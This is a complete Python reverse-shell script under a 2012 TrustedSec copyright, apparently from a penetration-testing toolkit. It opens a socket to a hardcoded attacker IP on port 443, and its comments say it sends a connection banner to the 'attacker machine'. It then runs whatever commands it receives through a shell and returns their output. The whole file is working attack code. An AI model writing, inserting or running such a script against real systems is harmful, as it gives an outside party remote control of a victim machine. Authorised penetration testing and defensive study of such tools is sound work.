#!/usr/bin/python
# imports here
# Copyright 2012 TrustedSec, LLC. All rights reserved. 
#
# This piece of software code is licensed under the FreeBSD license..
#
# Visit http://www.freebsd.org/copyright/freebsd-license.html for more information. 
import socket,subprocess
HOST = '172.16.32.137'    # The remote host
PORT = 443            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
s.send('[*] Connection Established!')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
